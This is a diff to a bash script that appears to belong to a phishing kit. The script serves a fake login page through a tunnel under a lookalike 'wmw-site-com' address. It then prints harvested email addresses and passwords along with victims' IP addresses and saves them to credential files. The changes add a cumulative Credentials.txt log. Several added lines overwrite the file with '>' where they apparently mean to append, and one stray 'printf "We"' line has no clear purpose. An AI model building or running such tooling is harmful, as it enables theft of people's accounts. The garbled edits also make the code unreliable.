@@ -331,6 +331,7 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*
 printf "${BYellow}Your Domain is:${BGreen} %s\e[0m\n" $link
 printf "\n"
 sleep 2
+printf "We"
 xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
 sleep 1
 
@@ -360,6 +361,7 @@ printf "${BGreen}OK.${clear}\n\n"
 printf "${BYellow}Your URL name is: ${BGreen}https://wmw-$site-com.loca.lt\n"
 printf "\n"
 sleep 2
+printf "Website: $site \n\n" > webpage/credentials.txt
 xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
 sleep 1
 
@@ -389,10 +391,18 @@ IFS=$'\n'
 password=$(grep -o 'Pass:.*' webpage/$site/usernames.txt | cut -d ":" -f2)
 printf "${BGreen}Got the Email: ${White}%s\n\e[0m" $account
 printf "${BGreen}Got the Password: ${White}%s\n\e[0m" $password
-printf "Website: $site \n\n" >> webpage/credentials.txt
+printf "\nIP Addr:" > webpage/credentials.txt
 cat webpage/$site/ip.txt | grep IP >> webpage/credentials.txt
+printf "\nAccount:" > webpage/credentials.txt
 cat webpage/$site/usernames.txt >> webpage/credentials.txt
 echo "==================================" >> webpage/credentials.txt
+if [[ -e Credentials.txt ]]; then
+cat webpage/credentials.txt >> Credentials.txt
+else
+printf "Credential:\n" >> Credentials.txt
+cat webpage/credentials.txt >> Credentials.txt
+fi
+#======================================
 printf "${UGreen}Saved: ${White}webpage/credentials.txt\e[0m\n"
 printf "\n"
 printf "${BYellow}Warning...\n${BRed}About to Close!\n"
